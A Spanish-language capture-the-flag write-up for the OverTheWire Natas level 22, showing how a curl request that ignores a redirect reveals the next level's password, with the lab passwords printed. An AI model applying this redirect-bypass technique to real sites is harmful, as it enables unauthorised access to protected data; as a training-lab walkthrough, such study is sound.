# Natas 22

#### URL: http://natas22.natas.labs.overthewire.org/
#### Credenciales: natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz

Si el parametro revelio existe en la peticion GET entonces se revela la contraseña:
```php
<?php
    if(array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
    }
?>
```

Sin embargo cuando no se es administrador se devuelve la cabecera Location:
``` php
if(array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password

    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
    header("Location: /");
    }
}
```

![2025-03-20-203328_765x237_scrot](https://github.com/user-attachments/assets/eea880d5-aa2d-4009-af00-f47560f2578e)

Esto lo que provoca una rapida redireccion pero hay una vulnerabilidad IDOR porque primero se visita la ruta en donde se muetra la contraseña independientemente de si se es admin o no.

Podemos evitar seguir la redireccion con curl:
``` bash
curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz http://natas22.natas.labs.overthewire.org/index.php?revelio=1 --max-redirs 0

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas22", "pass": "d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz" };</script></head>
<body>
<h1>natas22</h1>
<div id="content">

You are an admin. The credentials for the next level are:<br><pre>Username: natas23
Password: dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs</pre>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

`natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs`
